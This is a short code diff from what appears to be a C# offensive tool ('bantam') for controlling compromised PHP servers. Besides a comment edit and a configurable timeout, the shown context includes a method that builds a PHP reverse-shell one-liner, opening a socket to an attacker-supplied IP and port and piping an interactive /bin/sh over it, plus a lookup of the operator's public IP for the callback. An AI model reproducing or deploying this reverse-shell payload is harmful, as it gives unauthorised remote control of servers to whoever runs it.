@@ -110,7 +110,7 @@ namespace bantam.Forms
         /// <returns></returns>
         public string PhpShell(string ip, string port)
         {
-            //todo this requires exec, lets add more shell execution methods incause of disabled functions or possibly not use two system calls???
+            //todo utilize the selected shell code vector
             string phpShell = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");"
                             + "system(\"/bin/sh -i <&3 >&3 2>&3\");'";
 
@@ -326,8 +326,7 @@ namespace bantam.Forms
         {
             var task = WebHelper.GetRequest("http://ipv4bot.whatismyipaddress.com/");
 
-            //Todo tie this timeout in as a configureable option
-            if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
+            if (await Task.WhenAny(task, Task.Delay(Config.TimeoutMS)) == task) {
                 if (string.IsNullOrEmpty(task.Result)) {
                     MessageBox.Show("Unable to get IP Address", "Connection Failed");
                 } else {
